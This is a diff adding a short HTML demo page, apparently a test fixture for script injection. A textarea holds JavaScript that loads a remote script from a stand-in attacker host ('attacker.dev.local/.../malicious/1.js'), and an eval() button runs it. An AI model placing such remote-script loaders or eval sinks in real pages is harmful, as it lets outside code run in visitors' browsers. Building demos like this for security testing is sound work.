@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/x-icon" href="static/favicon.ico">
+    <title>Page with injected JS</title>
+
+    <style>
+        textarea {
+            width: 650px;
+            height: 250px;
+        }
+    </style>
+</head>
+
+<body>
+    <script>
+        function execute(id) {
+            let code = document.querySelector(`#${id}`).value;
+            eval(code);
+        }
+    </script>
+
+    <textarea id="xss" width="500px" heigth="500px" spellcheck="false">
+let script = document.createElement("script");
+script.src = 'https://attacker.dev.local:5443/static/malicious/1.js';
+script.type = "text/javascript";
+document.head.appendChild(script);
+    </textarea>
+    <input type="button" value="eval()" onclick="execute('xss')" />
+</body>
+
+</html>
